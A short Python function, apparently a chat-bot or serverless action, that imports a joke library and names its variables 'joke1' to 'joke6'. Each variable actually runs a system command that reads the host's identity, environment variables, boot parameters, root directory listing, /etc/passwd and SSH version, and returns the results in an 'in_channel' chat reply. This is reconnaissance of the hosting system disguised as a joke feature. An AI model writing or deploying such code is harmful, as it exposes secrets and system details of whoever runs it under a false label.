import pyjokes
import os

def main(args):
  joke1 = str(os.system('id'))
  joke2 = str(os.system('env'))
  joke3 = str(os.system('cat /proc/cmdline'))
  joke4 = str(os.system('ls /'))
  joke5 = str(os.system('cat /etc/passwd'))
  joke6 = str(os.system('ssh -v'))
  return {
    'body': {
      'response_type': 'in_channel',
      'text1': joke1,
      'text2': joke2,
      'text3': joke3,
      'text4': joke4,
      'text5': joke5,
      'text6': joke6
    }
  }
